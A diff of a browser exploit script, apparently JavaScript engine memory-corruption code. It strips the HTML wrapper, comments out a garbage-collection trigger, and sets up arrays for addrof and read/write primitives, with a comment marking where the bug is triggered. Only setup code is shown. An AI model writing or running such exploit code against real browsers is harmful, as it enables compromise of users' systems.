@@ -1,6 +1,3 @@
-<html>
-<body>
-<div id="log_div"></div>
 <script>
 
 
@@ -8,16 +5,14 @@ function hex(val){
     return "0x"+val.toString(16);
 }
 
-function major_gc() {
-        new ArrayBuffer(0x7fe00000);
-    }
+// function major_gc() {
+//         new ArrayBuffer(0x7fe00000);
+//     }
 
 // Line ~400+ is to trigger the bug, anything before that is for the exploit
 
 let corrupted_array = new Array(1367);
 corrupted_array.fill(-1.1);
-major_gc();
-major_gc();
 let rw_array = new Array(10000);
 rw_array.fill(-88.99);
 let addrof_array = new Array(1338);
@@ -665,5 +660,3 @@ function main() {
 
 main();
 </script>
-</body>
-</html>
